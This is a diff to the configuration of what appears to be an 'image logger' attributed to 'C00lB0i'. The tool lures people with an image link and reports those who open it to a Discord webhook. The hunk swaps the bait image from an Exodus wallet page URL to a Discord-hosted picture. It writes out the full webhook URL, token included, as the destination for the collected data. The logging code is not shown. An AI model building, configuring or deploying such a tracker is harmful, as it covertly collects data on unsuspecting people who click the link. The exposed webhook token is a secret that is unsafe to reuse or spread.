@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1480018525975216129/bGlf7LBrEY5VlXcA428hf2sfeSiQQp1cTeB1Y4iOGCHYjJfBG5Q2I5Kt7LSTuxJKVzZD",
-    "image": "https://www.exodus.com/desktop", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1466947759168028855/1480026301573103826/image.png?ex=69ae2d67&is=69acdbe7&hm=5f36a0ff7b767537076bf6b32b1f06ee16f184d638d8b261ead129597bbd9de3&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
